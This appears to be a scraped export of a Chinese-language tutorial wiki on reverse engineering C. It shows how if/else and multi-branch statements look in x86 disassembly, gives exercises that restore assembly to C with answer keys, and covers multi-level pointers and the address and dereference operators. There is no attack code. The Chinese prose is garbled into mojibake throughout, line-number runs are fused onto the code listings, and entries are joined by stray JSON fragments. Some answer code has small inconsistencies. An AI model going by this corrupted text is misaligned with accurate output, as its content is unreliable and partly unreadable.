123456789;å…ˆæ‰§è¡Œå½±å“æ ‡å¿—ä½çš„ç›¸å…³æŒ‡ä»¤ jxx ELSE_BEGIN ;è¯¥åœ°å€ä¸ºelseè¯­å¥å—çš„é¦–åœ°å€IF_BEGIN: ...... ;ifè¯­å¥å—å†…çš„æ‰§è¡Œä»£ç IF_END: jmp ELSE_END ;è·³è½¬åˆ°elseè¯­å¥å—çš„ç»“æŸåœ°å€ELSE_BEGIN: ...... ;elseè¯­å¥å—å†…çš„æ‰§è¡Œä»£ç ELSE_END: å¤šåˆ†æ”¯è¯­å¥ 1234567891011121314151617181920#include &lt;stdio.h&gt;int main()&#123; int x=10; if(x&gt;0) &#123; printf(&quot;x&gt;0 &quot;); &#125;\telse if(x==0)\t&#123; printf(&quot;x=0 &quot;);\t&#125;\telse\t&#123; printf(&quot;x&lt;0 &quot;);\t&#125; return 0;&#125; ä»ä¸Šå¾€ä¸‹çœ‹ 1230040D408 mov dword ptr [ebp-4],0Ah0040D40F cmp dword ptr [ebp-4],00040D413 jle main+34h (0040d424) ä½œæ¯”è¾ƒï¼Œç„¶åè·³åˆ°äº†0040d424ï¼Œæ˜¯ä¸ªifè¯­å¥ã€‚ éšåçœ‹åˆ°0040d424ä¸Šæ–¹æ˜¯ä¸ªjmpï¼Œè¿™é‡Œå¯èƒ½æ˜¯ä¸Šé¢ifé…å¥—çš„elseã€‚ 120040D422 jmp main+56h (0040d446)0040D424 cmp dword ptr [ebp-4],0 ï¼ˆä»¥ä¸Šæ˜¯å‰é¢è®²çš„ifè¯­å¥ï¼Œå’Œï¼Œifâ€¦elseè¯­å¥ç»“æ„çš„çŸ¥è¯†ï¼‰ ä½†ç´§è·Ÿç€åˆæ¥äº†ä¸€ä¸ªè·³è½¬ï¼Œæ‰€ä»¥ä¸Šé¢çš„æ˜¯else ifç»“æ„ã€‚ 10040D428 jne main+49h (0040d439) é‚£ä¹ˆelseè¯­å¥å—åœ¨å“ªï¼šæ‰§è¡Œå‰æ²¡æœ‰jxxè·³è½¬ã€‚ ç‰¹ç‚¹åˆ†æ 1ã€æ¯ä¸ªæ¡ä»¶è·³è½¬æŒ‡ä»¤è·³è½¬åˆ°çš„åœ°å€é‚£,ä¸Šä¸€æ¡æŒ‡ä»¤éƒ½æœ‰jmp 2ã€è¿™äº›jmpæŒ‡ä»¤è·³è½¬çš„åœ°å€éƒ½æ˜¯ä¸€æ ·çš„ï¼ˆå¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾ï¼‰ 3ã€å¦‚æœæŸä¸ªåˆ†æ”¯æ²¡æœ‰æ¡ä»¶åˆ¤æ–­ï¼Œåˆ™ä¸ºelseéƒ¨åˆ† 12345678910111213141516;ä¼šå½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx ELSE_IF_BEGIN ;è·³è½¬åˆ°ä¸‹ä¸€æ¡else ifè¯­å¥å—çš„é¦–åœ°å€IF_BEGIN: ...... ;ifè¯­å¥å—å†…çš„æ‰§è¡Œä»£ç IF_END: jmp END ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾åœ°å€ELSE_IF_BEGIN: ;else ifè¯­å¥å—çš„èµ·å§‹åœ°å€;å¯å½±å“æ ‡å¿—ä½çš„æŒ‡ä»¤ jxx ELSE_BEGIN ;è·³è½¬åˆ°elseåˆ†æ”¯è¯­å¥å—çš„é¦–åœ°å€ ...... ;else ifè¯­å¥å—å†…çš„æ‰§è¡Œä»£ç  ELSE_IF_END: ;else ifç»“å°¾å¤„ jmp END ;è·³è½¬åˆ°å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾åœ°å€ELSE_BEGIN: ;elseè¯­å¥å—çš„èµ·å§‹åœ°å€ ...... ;elseè¯­å¥å—å†…çš„æ‰§è¡Œä»£ç END: ;å¤šåˆ†æ”¯ç»“æ„çš„ç»“å°¾å¤„ ...... é€†å‘åˆ†æä¾‹å­å’Œç»ƒä¹  ifè¯­å¥ å‡½æ•°è°ƒç”¨å¤„ä»£ç  1234push 5\tpush 4\tcall 0040100f\tadd esp,8 å‡½æ•°å†…éƒ¨ä»£ç  12345678910111213141516171819202100401030 push ebp00401031 mov ebp,esp00401033 sub esp,40h00401036 push ebx00401037 push esi00401038 push edi00401039 lea edi,[ebp-40h]0040103C mov ecx,10h00401041 mov eax,0CCCCCCCCh00401046 rep stos dword ptr [edi]00401048 mov eax,dword ptr [ebp+8]0040104B cmp eax,dword ptr [ebp+0Ch]0040104E jle 0040105900401050 mov ecx,dword ptr [ebp+8]00401053 mov dword ptr [004225c4],ecx00401059 pop edi0040105A pop esi0040105B pop ebx0040105C mov esp,ebp0040105E pop ebp0040105F ret åˆ†æè¿‡ç¨‹ å‡½æ•°è°ƒç”¨å¤„ä»£ç ï¼Œåˆ†æï¼Œä¸¤ä¸ªå‚æ•° å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æ åˆ†æå‚æ•° 123[ebp+8] : X[ebp+0Ch] :Y åˆ†æå±€éƒ¨å˜é‡ æ— ã€‚æ²¡çœ‹åˆ°[ebp-å‡ ] åˆ†æå…¨å±€å˜é‡ 1mov dword ptr 004225c4,ecx åŠŸèƒ½åˆ†æ 12mov eax,dword ptr [ebp+8]cmp eax,dword ptr [ebp+0Ch] å°†å‚æ•°Xå­˜åˆ°åˆ°EAXä¸­ï¼Œç„¶åæ¯”è¾ƒEAXä¸å‚æ•°Yçš„å¤§å° å¦‚æœX&lt;=Y,é‚£ä¹ˆè·³è½¬åˆ°00401059çš„ä½ç½®;å¦åˆ™ï¼Œå°†Xçš„å€¼å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ã€‚ è¿”å›å€¼åˆ†æ æ—  å°ç»“ å…ˆåˆ†æå’Œç¡®å®šå‚æ•°ï¼Œç„¶ååˆ†æåŠŸèƒ½ ç»ƒä¹  æŒ‰ä¸Šè¿°åˆ†ææµç¨‹åˆ†æä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿˜åŸæˆCè¯­è¨€ 1234567891011121314151617181920212223242526272829push 5push 4call 0040100fadd esp,800401030 push ebp00401031 mov ebp,esp00401033 sub esp,44h00401036 push ebx00401037 push esi00401038 push edi00401039 lea edi,[ebp-44h]0040103C mov ecx,11h00401041 mov eax,0CCCCCCCCh00401046 rep stos dword ptr [edi]00401048 mov eax,[004225c4]0040104D mov dword ptr [ebp-4],eax00401050 mov ecx,dword ptr [ebp+8]00401053 cmp ecx,dword ptr [ebp+0Ch]00401056 jg 0040106400401058 mov edx,dword ptr [ebp+0Ch]0040105B add edx,dword ptr [ebp-4]0040105E mov dword ptr [004225c4],edx00401064 pop edi00401065 pop esi00401066 pop ebx00401067 mov esp,ebp00401069 pop ebp0040106A ret ç­”æ¡ˆå‡½æ•°è°ƒç”¨å¤„ä»£ç ï¼Œåˆ†æï¼Œä¸¤ä¸ªå‚æ•°å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æåˆ†æå‚æ•°123[ebp+8] : X[ebp+0Ch] :Yåˆ†æå±€éƒ¨å˜é‡1[ebp-4] : aåˆ†æå…¨å±€å˜é‡12300401048 mov eax,[004225c4]0040105E mov dword ptr [004225c4],edxå¤§å°ä¸º4å­—èŠ‚çš„å…¨å±€å˜é‡åŠŸèƒ½åˆ†æ1234567891000401048 mov eax,[004225c4]0040104D mov dword ptr [ebp-4],eax00401050 mov ecx,dword ptr [ebp+8]00401053 cmp ecx,dword ptr [ebp+0Ch]00401056 jg 0040106400401058 mov edx,dword ptr [ebp+0Ch]0040105B add edx,dword ptr [ebp-4]0040105E mov dword ptr [004225c4],edxå°†å…¨å±€å˜é‡èµ‹å€¼ç»™å±€éƒ¨å˜é‡aå‚æ•°Xå’Œå‚æ•°Yæ¯”å¤§å°ï¼Œå¦‚æœX&gt;Yï¼Œè·³è½¬åˆ°00401064çš„ä½ç½®ï¼Œç»“æŸè°ƒç”¨ï¼›å¦åˆ™ï¼Œå°†Y+açš„å€¼å­˜å‚¨åˆ°å…¨å±€å˜é‡ä¸­ã€‚è¿”å›å€¼åˆ†ææ— è¿˜åŸæˆCè¯­è¨€ä»£ç 12345678910int g;void Func(int x,int Y)&#123; int a=g; if(X&lt;=Y) &#123; g=a+Y; &#125;&#125; ifâ€¦elseâ€¦è¯­å¥ 12345678910111213141516171819202122232425262728004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,44h004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-44h]004010BC mov ecx,11h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov eax,[004225c4]004010CD mov dword ptr [ebp-4],eax004010D0 mov ecx,dword ptr [ebp+8]004010D3 cmp ecx,dword ptr [ebp+0Ch]004010D6 jle 004010e6004010D8 mov edx,dword ptr [ebp+8]004010DB add edx,dword ptr [ebp-4]004010DE mov dword ptr [004225c4],edx004010E4 jmp 004010f1004010E6 mov eax,dword ptr [ebp+0Ch]004010E9 add eax,dword ptr [ebp-4]004010EC mov [004225c4],eax004010F1 pop edi004010F2 pop esi004010F3 pop ebx004010F4 mov esp,ebp004010F6 pop ebp004010F7 ret å‡½æ•°å†…éƒ¨åŠŸèƒ½åˆ†æ åˆ†æå‚æ•° 123[ebp+8] : X[ebp+0Ch] :Y åˆ†æå±€éƒ¨å˜é‡ 1[ebp-4] = eax = [004225c4] åˆ†æå…¨å±€å˜é‡ 1[004225c4] G åŠŸèƒ½åˆ†æ æ¯”è¾ƒXå’ŒYçš„å¤§å°ã€‚ å¦‚æœX&lt;=Yï¼Œæ‰§è¡Œ 123004010E6 mov eax,dword ptr [ebp+0Ch]004010E9 add eax,dword ptr [ebp-4]004010EC mov [004225c4],eax 123YY=Y+GG=Y å¦‚æœX&gt;Yï¼Œé‚£ä¹ˆæ‰§è¡Œ 1234004010D8 mov edx,dword ptr [ebp+8]004010DB add edx,dword ptr [ebp-4]004010DE mov dword ptr [004225c4],edx004010E4 jmp 004010f1 123XX=X+GG=X è¿”å›å€¼åˆ†æ æ—  ç»ƒä¹  æŒ‰ä¸Šè¿°åˆ†ææµç¨‹åˆ†æä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿˜åŸæˆCè¯­è¨€ 12345678910111213141516171819202122232425262728293031323334004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,48h004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-48h]004010BC mov ecx,12h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov eax,[004225c4]004010CD mov dword ptr [ebp-4],eax004010D0 mov dword ptr [ebp-8],2004010D7 mov ecx,dword ptr [ebp+8]004010DA cmp ecx,dword ptr [ebp+0Ch]004010DD jl 004010e8004010DF mov edx,dword ptr [ebp-8]004010E2 add edx,1004010E5 mov dword ptr [ebp-8],edx004010E8 mov eax,dword ptr [ebp+8]004010EB cmp eax,dword ptr [ebp+0Ch]004010EE jge 004010fb004010F0 mov ecx,dword ptr [ebp-8]004010F3 mov dword ptr [004225c4],ecx004010F9 jmp 00401107004010FB mov edx,dword ptr [ebp-4]004010FE add edx,dword ptr [ebp-8]00401101 mov dword ptr [004225c4],edx00401107 pop edi00401108 pop esi00401109 pop ebx0040110A mov esp,ebp0040110C pop ebp0040110D ret ç­”æ¡ˆåˆ†æå‚æ•°123[ebp+8] : x[ebp+0Ch] :yåˆ†æå±€éƒ¨å˜é‡123[ebp-4] : a[ebp-8] : båˆ†æå…¨å±€å˜é‡1[004225c4] gå¤§å°ä¸º4å­—èŠ‚çš„å…¨å±€å˜é‡åŠŸèƒ½åˆ†æ12a=g;b=2;å‚æ•°xå’Œå‚æ•°yæ¯”å¤§å°ï¼šå¦‚æœx&gt;=yï¼Œæ‰§è¡Œ123004010DF mov edx,dword ptr [ebp-8]004010E2 add edx,1004010E5 mov dword ptr [ebp-8],edx1b=b+1;å¦‚æœx&lt;yï¼Œè·³åˆ°004010E8å‚æ•°xå’Œå‚æ•°yæ¯”å¤§å°ï¼šå¦‚æœx&gt;=yï¼Œæ‰§è¡Œ123004010FB mov edx,dword ptr [ebp-4]004010FE add edx,dword ptr [ebp-8]00401101 mov dword ptr [004225c4],edx1g=a+b;å¦‚æœx&lt;yï¼Œæ‰§è¡Œ123004010F0 mov ecx,dword ptr [ebp-8]004010F3 mov dword ptr [004225c4],ecx004010F9 jmp 004011071g=b;è¿”å›å€¼åˆ†ææ— è¿˜åŸæˆCè¯­è¨€ä»£ç 12345678910111213141516171819int g;void func(int x,int y)&#123; int a=g; int b=2; if(x&gt;=y) &#123; b+=1; &#125; if(x&gt;=y) &#123; g=a+b; &#125; else &#123; g=b; &#125;&#125; å¤šåˆ†æ”¯è¯­å¥ åˆ†æå‚æ•° 12345[ebp+8] : X[ebp+0Ch] :Y[ebp+10h] :Z åˆ†æå±€éƒ¨å˜é‡ 123[ebp-4] = A = 0[ebp-8] = B = 1[ebp-0Ch] = C = 2 åˆ†æå…¨å±€å˜é‡ æ—  åŠŸèƒ½åˆ†æ 1234567891011121314151617if(x&gt;y)&#123;\tA = B+1;&#125;else if(x&gt;z)&#123;\tA = C+1;&#125;else if(y&gt;z)&#123;\tA = B+C&#125;else&#123;\tA = B+C+1;&#125; return A; ç»ƒä¹  æŒ‰ä¸Šè¿°åˆ†ææµç¨‹åˆ†æä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿˜åŸæˆCè¯­è¨€ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546004010B0 push ebp004010B1 mov ebp,esp004010B3 sub esp,4Ch004010B6 push ebx004010B7 push esi004010B8 push edi004010B9 lea edi,[ebp-4Ch]004010BC mov ecx,13h004010C1 mov eax,0CCCCCCCCh004010C6 rep stos dword ptr [edi]004010C8 mov dword ptr [ebp-4],0004010CF mov dword ptr [ebp-8],1004010D6 mov dword ptr [ebp-0Ch],2004010DD mov eax,dword ptr [ebp+8]004010E0 cmp eax,dword ptr [ebp+0Ch]004010E3 jg 004010f0004010E5 mov ecx,dword ptr [ebp-8]004010E8 sub ecx,1004010EB mov dword ptr [ebp-4],ecx004010EE jmp 00401123004010F0 mov edx,dword ptr [ebp+0Ch]004010F3 cmp edx,dword ptr [ebp+10h]004010F6 jl 00401103004010F8 mov eax,dword ptr [ebp-0Ch]004010FB add eax,1004010FE mov dword ptr [ebp-4],eax00401101 jmp 0040112300401103 mov ecx,dword ptr [ebp+8]00401106 cmp ecx,dword ptr [ebp+10h]00401109 jle 004011160040110B mov edx,dword ptr [ebp-8]0040110E add edx,dword ptr [ebp-0Ch]00401111 mov dword ptr [ebp-4],edx00401114 jmp 0040112300401116 mov eax,dword ptr [ebp-0Ch]00401119 mov ecx,dword ptr [ebp-8]0040111C lea edx,[ecx+eax-1]00401120 mov dword ptr [ebp-4],edx00401123 mov eax,dword ptr [ebp-4]00401126 add eax,100401129 pop edi0040112A pop esi0040112B pop ebx0040112C mov esp,ebp0040112E pop ebp0040112F ret ç­”æ¡ˆåˆ†æå‚æ•°12345[ebp+8] : X[ebp+0Ch] :Y[ebp+10h] :Zåˆ†æå±€éƒ¨å˜é‡123[ebp-4] = A = 0[ebp-8] = B = 1[ebp-0Ch] = C = 2åˆ†æå…¨å±€å˜é‡æ— åŠŸèƒ½åˆ†æ1234567891011121314151617181920212223int func(int x,int y,int z)&#123; int a=0; int b=1; int c=2; if(x&lt;=y) &#123; a=b-1; &#125; else if(y&gt;=z) &#123; a=c+1; &#125; else if(x&gt;z) &#123; a=b+c; &#125; else &#123; a=c+b-1; &#125; return a+1;&#125;"},{"title":"å¤šçº§æŒ‡é’ˆ","path":"/wiki/C/å¤šçº§æŒ‡é’ˆ.html","content":"123456789int i = 100; int* p1 = &amp;i; //å–å˜é‡i çš„åœ°å€ï¼Œ&amp;i è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯i å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int*int** p2 = &amp;p1; //å–å˜é‡p1çš„åœ°å€ï¼Œ&amp;p1è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p1å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int** int*** p3 = &amp;p2; //å–å˜é‡p2çš„åœ°å€ï¼Œ&amp;p2è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p2å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int***int**** p4 = &amp;p3; //å–å˜é‡p3çš„åœ°å€ï¼Œ&amp;p3è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p3å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int****int***** p5 = &amp;p4; //å–å˜é‡p4çš„åœ°å€ï¼Œ&amp;p4è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p4å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int*****int****** p6 = &amp;p5; //å–å˜é‡p5çš„åœ°å€ï¼Œ&amp;p5è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p5å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int******int******* p7 = &amp;p6; //å–å˜é‡p6çš„åœ°å€ï¼Œ&amp;p6è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p6å˜é‡çš„ç±»å‹åŠ ä¸Šä¸€ä¸ª*ï¼Œå³int******* 123456789int****** px1 = *(p7); //å–å˜é‡p7 ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*p7 è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯p7 å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int******int***** px2 = *(px1); //å–å˜é‡px1ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px1è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px1å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int*****int**** px3 = *(px2); //å–å˜é‡px2ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px2è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px2å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int****int*** px4 = *(px3); //å–å˜é‡px3ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px3è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px3å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int***int** px5 = *(px4); //å–å˜é‡px4ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px4è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px4å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int**int* px6 = *(px5); //å–å˜é‡px5ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px5è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px5å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³int*int px7 = *(px6); //å–å˜é‡px6ä¸ºåœ°å€æŒ‡å‘çš„å€¼ï¼Œ*px6è¡¨è¾¾å¼ç»“æœçš„ç±»å‹æ˜¯px6å˜é‡çš„ç±»å‹å‡å»ä¸€ä¸ª*ï¼Œå³intint px7 = *(*(*(*(*(*(*(p7))))))); //ç›´æ¥å†™ï¼ŒæŒ‡é’ˆp7æœ‰7ä¸ª*ï¼Œæœ€å¤šèƒ½å–7æ¬¡ æŒ‡é’ˆå–å€¼çš„ä¸¤ç§æ–¹å¼ æƒ³å–å‡ºæŒ‡é’ˆæŒ‡å‘çš„å€¼æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€æ˜¯ç”¨*å–å€è¿ç®—ç¬¦ï¼ŒäºŒæ˜¯ç”¨æ•°ç»„çš„å½¢å¼ã€‚ ä¸€çº§æŒ‡é’ˆäºŒçº§æŒ‡é’ˆä¸‰çº§æŒ‡é’ˆ12345678910#include &quot;stdafx.h&quot;int main()&#123; int* p = (int*)1; printf(&quot;%d %d &quot;, p[0], *p); //p[0] = *(p+0) = *p return 0;&#125; ä¸€æ¬¡å–å€ 120040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax] 12345678910#include &quot;stdafx.h&quot;int main()&#123; int** p = (int**)1; printf(&quot;%d %d &quot;, p[0][0], **p); //p[0][0] = *(*(p+0)+0) = **p return 0;&#125; ä¸¤æ¬¡å–å€ 1230040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax]00401034 mov edx,dword ptr [ecx] 12345678910#include &quot;stdafx.h&quot;int main()&#123; int*** p = (int***)1; printf(&quot;%d %d %d &quot;, p[0][0][0], ***p); //p[0][0] = *(*(*(p+0)+0)+0) = ***p return 0;&#125; ä¸‰æ¬¡å–å€ 12340040102F mov eax,dword ptr [ebp-4]00401032 mov ecx,dword ptr [eax]00401034 mov edx,dword ptr [ecx]00401036 mov eax,dword ptr [edx] å°ç»“ï¼š*() ä¸ []å¯ä»¥äº’æ¢ å¦‚æœæœ‰åç§» ä¸€çº§æŒ‡é’ˆäºŒçº§æŒ‡é’ˆä¸‰çº§æŒ‡é’ˆ12345678910#include &quot;stdafx.h&quot;int main()&#123; int* p = (int*)1; printf(&quot;%d %d &quot;, p[1], *(p+1)); //p[1] = *(p+1) return 0;&#125; åˆ†æ*(p+1)ï¼š è¡¨è¾¾å¼ ç±»å‹ å»æ‰ä¸€ä¸ª*åçš„ç±»å‹ +1æ˜¯åŠ å‡  p int* intï¼Œå®½åº¦ä¸º4 â€“ (p+1) int* intï¼Œå®½åº¦ä¸º4 4 *(p+1) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint â€“ â€“ 12345678910#include &quot;stdafx.h&quot;int main()&#123; int** p = (int**)1; printf(&quot;%d %d &quot;, p[1][2], *(*(p+1)+2)); //p[1][2] = *(*(p+1)+2) return 0;&#125; åˆ†æ*(*(p+1)+2)ï¼š è¡¨è¾¾å¼ ç±»å‹ å»æ‰ä¸€ä¸ª*åçš„ç±»å‹ +1æ˜¯åŠ å‡  p int** int*ï¼Œå®½åº¦ä¸º4 â€“ (p+1) ä»ä¸ºint** int*ï¼Œå®½åº¦ä¸º4 4 *(p+1) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint* â€“ â€“ *(p+1)+2 ä»ä¸ºint* intï¼Œå®½åº¦ä¸º4 4 *(*(p+1)+2) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint â€“ â€“ æ‰€ä»¥ä¼šçœ‹åˆ°+4ï¼Œå’Œ+8 12345678910#include &quot;stdafx.h&quot;int main()&#123; int*** p = (int***)1; printf(&quot;%d %d %d &quot;, p[1][2][3], *(*(*(p+1)+2)+3)); //p[1][2][3] = *(*(*(p+1)+2)+3) return 0;&#125; åˆ†æ*(*(*(p+1)+2)+3)ï¼š è¡¨è¾¾å¼ ç±»å‹ å»æ‰ä¸€ä¸ª*åçš„ç±»å‹ +1æ˜¯åŠ å‡  p int*** int**ï¼Œå®½åº¦ä¸º4 â€“ (p+1) ä»ä¸ºint*** int**ï¼Œå®½åº¦ä¸º4 4 *(p+1) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint** â€“ â€“ *(p+1)+2 ä»ä¸ºint** int*ï¼Œå®½åº¦ä¸º4 4 *(*(p+1)+2) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint* â€“ â€“ *(*(p+1)+2)+3 ä»ä¸ºint* intï¼Œå®½åº¦ä¸º4 4 *(*(*(p+1)+2)+3) åŸç±»å‹å»æ‰ä¸€ä¸ª*ï¼Œä¸ºint â€“ æ‰€ä»¥ä¼šçœ‹åˆ°+4ï¼Œ+8ï¼Œ+0Ch å°ç»“ 1234*(p+i) = p[i] *(*(p+i)+k) = p[i][k] *(*(*(p+i)+k)+m) = p[i][k][m] *(*(*(*(*(p+i)+k)+m)+w)+t) = p[i][k][m][w][t]"},{"title":"å–å€&è¿ç®—ç¬¦å’Œå–å€¼*è¿ç®—ç¬¦","path":"/wiki/C/å–å€å’Œå–å€¼è¿ç®—ç¬¦.html","content":"&amp;è¿ç®—ç¬¦ ä½¿ç”¨ &amp;ï¼Œå–åœ°å€ç¬¦ã€‚ä»»ä½•å˜é‡éƒ½å¯ä»¥ä½¿ç”¨&amp;æ¥è·å–åœ°å€ï¼Œä½†ä¸èƒ½ç”¨åœ¨å¸¸é‡ä¸Š å¸¸é‡ç¼–è¯‘åæ˜¯æ­»çš„ï¼Œä¸èƒ½æ”¹äº†ï¼Œæ‰€ä»¥å«å¸¸é‡ 12345678910111213141516171819#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; char a;short b;int c;Point p; int main()&#123; printf(&quot;%x %x %x %x &quot;, &amp;a, &amp;b, &amp;c, &amp;p); printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; åœ¨è¿™é‡Œç›´æ¥ä½¿ç”¨å–åœ°å€ç¬¦è·å–å˜é‡ã€ç»“æ„ä½“çš„åœ°å€ï¼Œæ‰“å°è¾“å‡ºæ—¶çš„æ ¼å¼å¯èƒ½è·Ÿæˆ‘ä»¬ä¹‹å‰çœ‹åˆ°çš„8ä½ä¸ä¸€æ ·ï¼Œå‰é¢å°‘äº†2ä¸ª0ã€‚å°†%xå ä½ç¬¦æ›¿æ¢ä¸º%pæ¥æ‰“å°å°±æ˜¯äº†ã€‚ å…¨å±€å˜é‡çš„åœ°å€æ˜¯ç¼–è¯‘æ—¶ç¡®å®šï¼Œå±€éƒ¨å˜é‡çš„åœ°å€æ˜¯è°ƒç”¨å‡½æ•°æ—¶æ‰åˆ†é…åœ¨å †æ ˆä¸Šçš„ã€‚å¯ä»¥çœ‹åˆ°è·å–å…¨å±€å˜é‡çš„åœ°å€ï¼Œæ±‡ç¼–æŒ‡ä»¤ç”¨çš„æ˜¯offsetï¼Œè€Œè·å–å±€éƒ¨å˜é‡ç”¨çš„æ˜¯leaæŒ‡ä»¤ã€‚ LEAå’Œoffsetè¿ç®—ç¬¦çš„åŒºåˆ«ï¼š OFFSETåªé€‚ç”¨äºç¼–è¯‘æ—¶å·²çŸ¥çš„åœ°å€ å…¨å±€å˜é‡å±€éƒ¨å˜é‡12345678910111213141516171819202122#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; char a;short b;int c;Point p; int main()&#123;\ta=1;\tb=1;\tc=1; printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; 12345678910111213141516171819202122#include &quot;stdafx.h&quot;struct Point &#123; int x; int y;&#125;; int main()&#123;\tchar a;\tshort b;\tint c;\tPoint p;\ta=1;\tb=1;\tc=1; printf(&quot;%p %p %p %p &quot;, &amp;a, &amp;b, &amp;c, &amp;p); return 0;&#125; &amp;å˜é‡çš„ç±»å‹ ç¼–è¯‘æŠ¥é”™ ç¬¬12è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†char*ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬charç±»å‹çš„å˜é‡aï¼ŒåŠ &amp;å˜æˆ&amp;aåï¼Œç±»å‹ä¸ºchar*ç±»å‹ ç¬¬13è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†short**ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬short*ç±»å‹çš„å˜é‡bï¼ŒåŠ &amp;å˜æˆ&amp;båï¼Œç±»å‹ä¸ºshort**ç±»å‹ ç¬¬14è¡Œï¼Œç¼–è¯‘æŠ¥é”™ï¼Œæ— æ³•å°†int***ç±»å‹è½¬æ¢ä¸ºintç±»å‹ã€‚è¯´æ˜åŸæœ¬int**ç±»å‹çš„å˜é‡cï¼ŒåŠ &amp;å˜æˆ&amp;cåï¼Œç±»å‹ä¸ºint***ç±»å‹ ç»“è®ºï¼šï¼ˆ&amp;å˜é‡ï¼‰çš„ç±»å‹ï¼Œå°±æ˜¯å˜é‡åŸæ¥çš„ç±»å‹å†åŠ ä¸Šä¸€ä¸ª*å· æŒ‡é’ˆå˜é‡èµ‹å€¼ æˆ‘ä»¬èƒ½å¤Ÿçœ‹æ‡‚ï¼ˆ&amp;å˜é‡ï¼‰çš„ç±»å‹åï¼Œå°±çŸ¥é“æ€ä¹ˆç»™æŒ‡é’ˆå˜é‡èµ‹å€¼äº†ã€‚ ä¸ç”¨å»æƒ³p1ã€p2ã€p3ã€p4é‡Œé¢å­˜çš„æ˜¯ä»€ä¹ˆä¸œè¥¿ 123456789101112131415161718192021#include &lt;stdio.h&gt; int main()&#123; char x; char* p1; char** p2; char*** p3; char**** p4; p1 = &amp;x; // å¯¹xå˜é‡&amp;åï¼Œ&amp;xç±»å‹æ˜¯char* p2 = &amp;p1; // å¯¹p1å˜é‡&amp;åï¼Œ&amp;p1ç±»å‹æ˜¯char** p3 = &amp;p2; // å¯¹p2å˜é‡&amp;åï¼Œ&amp;p2ç±»å‹æ˜¯char*** p4 = &amp;p3; // å¯¹p3å˜é‡&amp;åï¼Œ&amp;p3ç±»å‹æ˜¯char**** int y; y= &amp;x; //&amp;xç±»å‹æ˜¯char*ï¼Œèµ‹ç»™intç±»å‹çš„yç¼–è¯‘ä¼šæŠ¥é”™ y= (int)&amp;x; //éè¦èµ‹å€¼åŠ å¼ºè½¬ return 